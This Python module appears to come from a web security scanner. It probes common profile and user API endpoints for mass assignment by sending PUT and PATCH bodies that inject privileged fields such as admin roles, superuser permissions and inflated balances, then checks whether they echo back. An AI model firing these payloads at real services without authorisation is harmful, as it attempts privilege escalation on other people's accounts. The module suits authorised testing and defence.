"""Mass Assignment / Excessive Data Exposure probe.

API3:2023 – Broken Object Property Level Authorization
Sends extra undeclared fields in PUT/PATCH/POST bodies and compares responses.
"""

import json

from core.http import fetch

# Extra privileged fields to inject
INJECT_FIELDS = {
    "role": "admin",
    "isAdmin": True,
    "is_admin": True,
    "admin": True,
    "permissions": ["admin", "superuser"],
    "privilege": "superuser",
    "verified": True,
    "active": True,
    "balance": 9999999,
    "credits": 9999999,
    "plan": "enterprise",
}

# API paths likely to accept PUT/PATCH
API_PATHS = [
    "/api/users/me",
    "/api/user",
    "/api/profile",
    "/api/account",
    "/user/profile",
    "/profile",
    "/me",
    "/api/v1/users/me",
    "/api/v1/profile",
]


def generate_tasks(url: str, config: dict) -> list:
    tasks = []
    base = url.rstrip("/")
    for path in API_PATHS:
        for method in ("PUT", "PATCH"):
            tasks.append(
                {
                    "url": base + path,
                    "method": method,
                    "type": "Mass Assignment",
                    "inject_fields": INJECT_FIELDS,
                    "executor": test_mass_assignment,
                }
            )
    return tasks


async def test_mass_assignment(session, task):
    url = task["url"]
    method = task.get("method", "PUT")
    inject = task.get("inject_fields", INJECT_FIELDS)
    try:
        # Send baseline request (empty body)
        base_text, base_resp = await fetch(session, url, method=method, json={})
        if base_resp is None:
            return {"type": "Mass Assignment", "url": url, "vulnerable": False}

        # Send injection payload
        inj_text, inj_resp = await fetch(session, url, method=method, json=inject)
        if inj_resp is None:
            return {"type": "Mass Assignment", "url": url, "vulnerable": False}

        hits = []
        if inj_text:
            low = inj_text.lower()
            for field, val in inject.items():
                str_val = str(val).lower()
                if field.lower() in low or str_val in low:
                    hits.append(field)

        # 200 on PATCH/PUT with injected fields echoed back → possible mass assignment
        vulnerable = inj_resp.status in (200, 201) and len(hits) > 0

        return {
            "type": "Mass Assignment",
            "url": url,
            "method": method,
            "vulnerable": vulnerable,
            "echoed_fields": hits,
            "status_baseline": base_resp.status,
            "status_injected": inj_resp.status,
            "note": f"Injected fields echoed: {hits}" if hits else "No echo detected",
        }
    except Exception as exc:
        return {"type": "Mass Assignment", "url": url, "error": str(exc), "vulnerable": False}
